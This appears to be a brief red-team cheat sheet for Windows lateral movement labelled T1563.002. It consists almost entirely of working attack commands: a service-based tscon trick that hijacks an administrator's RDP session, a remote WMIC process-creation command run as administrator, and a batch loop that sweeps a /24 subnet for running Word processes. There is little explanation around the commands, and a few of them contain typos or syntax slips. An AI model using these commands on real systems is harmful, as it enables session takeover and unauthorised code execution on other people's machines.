Bonous
Lateral Movement– T1563.002 

C:\Users\Soheil>quser
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 administrator         console             3  Active          1  8/9/2024 10:15 AM
>soheil                rdp-tcp#7           5  Active          .  8/9/2024 10:17 AM



```cmd
sc create sesshijack binpath= "cmd.exe /k tscon 3 /dest:rdp-tcp#7"
```

```cmd
net setart sesshijack
```

```cmd
sc delete sesshijack
```



WMIC
```c
wmic /node:1.1.1.1 /user:administrator process call create "cmd.exe /c calc"
```


specific scenario

```cmd
@echo off
setlocal enableDelayedExpansion

for /l %%i in (1,1,255) do (
    echo 192.168.1.%%i>>C:\ip_list.txt
)
for /f "tokens=*" %i in (C:\ip_list.txt) do wmic /node:%i process where "Name='winword.exe'" get Caption

```